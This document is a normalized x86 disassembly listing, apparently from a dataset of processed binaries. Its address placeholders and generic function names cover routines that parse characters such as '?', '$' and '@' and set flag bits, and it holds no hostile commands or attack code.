sub esp 0x20
push esi
push edi
mov ecx eax
shr ecx 0xf
xor edi edi
not ecx
inc edi
and ecx edi
je r-xdata
xor edi edi
test eax 0x1000
je r-xdata
mov ecx [ ebp + 0x8 ]
dec [ rwxdata ]
push r--data
call sub_41587f
mov eax [ ebp + 0x8 ]
sub eax 0x54
je r-xdata
mov eax [ rwxdata ]
movsx eax [ eax ]
and [ ebp - 0x8 ] 0x0
mov esi 0xffff0000
and [ ebp - 0x4 ] esi
inc [ rwxdata ]
sub eax 0x0
je r-xdata
push r--data
dec eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_417950
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_415aa8
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r--data
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
leave
retn
lea ecx [ ebp - 0x8 ]
call sub_415b7f
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov edi ecx
call sub_416119
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec eax
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] esi
test edi edi
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
sub_417b54
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
cmp [ eax ] 0x3f
jne r-xdata
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_41773a
inc eax
cmp [ eax ] 0x24
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ rwxdata ] eax
call sub_41700d
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4175e3
pop ecx
pop ecx
jmp r-xdata
add esp 0xc
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_417b9e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
call sub_414eb9
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_41587f
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41578d
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
mov eax ecx
sub eax 0x30
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_415d61
jmp r-xdata
dec eax
dec eax
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_415d61
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_417950
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
sub_417c3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
xor edi edi
mov esi 0xffff0000
and [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] edi
call sub_414901
mov ecx [ ebp + 0xc ]
mov ebx eax
cmp [ ecx ] edi
je r-xdata
mov [ ebp - 0x14 ] edi
test [ ecx + 0x4 ] 0x200
mov [ ebp - 0x14 ] 0x1
jne r-xdata
cmp ebx 0xfffe
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] edi
jmp r-xdata
cmp ebx 0xffff
jne r-xdata
cmp ebx 0xfffd
jne r-xdata
push ecx
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
and [ ebp - 0x4 ] 0x8000
mov edi 0x1800
mov ecx 0x1000
je r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x20 ]
call sub_415aa8
mov eax [ ebp - 0x4 ]
mov ecx 0x7c00
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] ebx
and [ ebp - 0xc ] edi
cmp [ ebp - 0xc ] 0x800
sete al
mov [ ebp - 0x8 ] eax
test eax eax
mov eax ebx
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6800
jne r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov esi 0x1000
mov eax ebx
je r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_4167ac
cmp [ ebp - 0x8 ] 0x0
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x7000
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx esi
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
test ebx 0x4000
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1100
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
test edx edx
je r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp eax 0x1200
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
call sub_415d61
jmp r-xdata
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_415fd3
mov eax [ ebp - 0x20 ]
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x1c ]
push 0x7b
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d0f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_415aa8
push r--data
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_415faf
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x48 ]
push eax
call sub_417b9e
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_415070
shr eax 0x3
not eax
test al 0x1
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1100
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
and edx ecx
cmp edx ecx
jne r-xdata
and [ ebp - 0x3c ] esi
and [ ebp - 0x44 ] esi
and [ ebp - 0xc ] esi
and [ ebp - 0x24 ] esi
and [ ebp - 0x2c ] esi
xor edi edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x30 ] edi
mov eax ebx
cmp edx edi
je r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_417b9e
pop ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_415ecb
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_415fd3
pop ecx
pop ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x7b
lea eax [ ebp - 0x38 ]
push eax
call sub_415f8b
mov ecx eax
call sub_415cc7
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
lea eax [ ebp - 0x48 ]
push eax
call sub_415c7c
mov esi 0x1000
pop ecx
test [ rwxdata ] esi
jne r-xdata
mov ecx 0x1000
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x6000
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
cmp edx edi
je r-xdata
cmp eax edi
je r-xdata
push r--data
lea ecx [ ebp - 0x20 ]
call sub_415d61
lea eax [ ebp - 0x48 ]
push eax
call sub_415bb4
mov eax [ rwxdata ]
pop ecx
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x2c
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d61
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1200
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41a1a4
pop ecx
pop ecx
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
and eax 0x1b00
xor edx edx
cmp eax 0x1100
sete dl
neg ecx
sbb ecx ecx
test edx ecx
jne r-xdata
test eax eax
je r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_415fd3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
xor edi edi
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov ecx eax
shr ecx 0x4
not ecx
test cl 0x1
je r-xdata
mov eax ebx
and eax ecx
cmp eax 0x7800
je r-xdata
push r--data
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x1200
sete dl
neg ecx
sbb ecx ecx
test edx ecx
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_415bb4
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_415070
shr eax 0x4
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
cmp edx edi
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_415fd3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_415fd3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_415fd3
add esp 0x18
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
test esi eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
xor edx edx
mov esi 0x800
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x34 ] esi
xor edi edi
mov [ ebp - 0x38 ] edi
cmp [ ebp - 0x14 ] edi
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_415bb4
pop ecx
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4153b2
pop ecx
push eax
lea ecx [ ebp - 0x30 ]
call sub_415070
call sub_4153b2
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ rwxdata ]
shr eax 0x9
not eax
test al 0x1
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x20
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d0f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_415aa8
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x1c ]
xor edi edi
push edi
push 0x8
mov ecx rwxdata
call sub_414ed8
cmp eax edi
je r-xdata
lea eax [ ebp - 0x50 ]
push edi
push eax
call sub_415749
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
test [ rwxdata ] 0x1000
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
test [ rwxdata ] 0x1000
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_415fd3
pop ecx
pop ecx
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax [ rwxdata ]
shr eax 0x7
not eax
test al 0x1
je r-xdata
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
lea eax [ ebp - 0x58 ]
push edi
push eax
call sub_415749
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] eax
mov [ eax ] edi
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov edi eax
mov esi [ ebp - 0x8 ]
mov eax ebx
test esi esi
je r-xdata
push eax
lea eax [ ebp - 0x38 ]
push eax
push 0x20
lea ecx [ ebp - 0x50 ]
call sub_415852
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
test ebx 0x10000
je r-xdata
test [ rwxdata ] 0x1000
jne r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] edx
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_416205
pop ecx
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x28
lea ecx [ ebp - 0x50 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x29
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d0f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
test esi esi
je r-xdata
test esi esi
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax 0x700
cmp eax 0x100
je r-xdata
xor eax eax
inc eax
mov eax ebx
and eax 0x700
sub eax 0x200
neg eax
sbb eax eax
inc eax
jmp r-xdata
mov eax [ rwxdata ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x58 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0x20 ]
call sub_415d61
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax esi
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x40
sete dl
mov eax edx
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
cmp eax edx
je r-xdata
call sub_4162e5
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_415070
call sub_4162e5
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
test esi esi
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x14 ]
push 0x2c
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x3c ] eax
call sub_415d0f
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x14 ]
push 0x2c
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d0f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_415aa8
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax edi
sub eax esi
jmp r-xdata
test edi edi
je r-xdata
mov eax [ rwxdata ]
shr eax 0x2
not eax
test al 0x1
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x2c
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d0f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax 0x1000
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x80
sete dl
mov eax edx
jmp r-xdata
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ edi ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x24 ]
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_415d61
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov edi 0x1800
mov eax ebx
and eax edi
neg eax
sbb eax eax
inc eax
push 0x0
test bl 0xc0
pop eax
sete al
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x600
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x400
jne r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
sub_4188f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi 0x2000
push edi
test [ rwxdata ] esi
je r-xdata
mov eax [ rwxdata ]
mov cl [ eax ]
cmp cl 0x3f
jne r-xdata
and [ rwxdata ] 0xffffdfff
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_41a0d5
or [ rwxdata ] esi
pop ecx
pop ecx
test cl cl
jne r-xdata
inc eax
mov [ rwxdata ] eax
cmp [ eax ] cl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
lea eax [ ebp - 0xc ]
push eax
call sub_417b54
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
xor eax eax
inc eax
pop ecx
test esi esi
je r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
and [ ebp - 0x4 ] 0x0
test ebx 0x200
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4188f4
mov eax [ rwxdata ]
pop ecx
jmp r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp al 0x40
je r-xdata
mov edi ebx
shr edi 0xf
and edi eax
cmp bl al
jle r-xdata
inc eax
mov [ rwxdata ] eax
jmp r-xdata
mov edx 0x8000
test edi edi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_418b62
mov eax [ ebp - 0x14 ]
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
or ebx edx
mov [ ebp - 0x8 ] ebx
or ebx 0x200
mov [ ebp - 0x8 ] ebx
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx 0x1000
test ecx ebx
jne r-xdata
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
push r--data
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
call sub_415d61
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_415aa8
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ rwxdata ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] ebx
call sub_415aa8
mov eax [ rwxdata ]
cmp [ eax ] 0x40
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
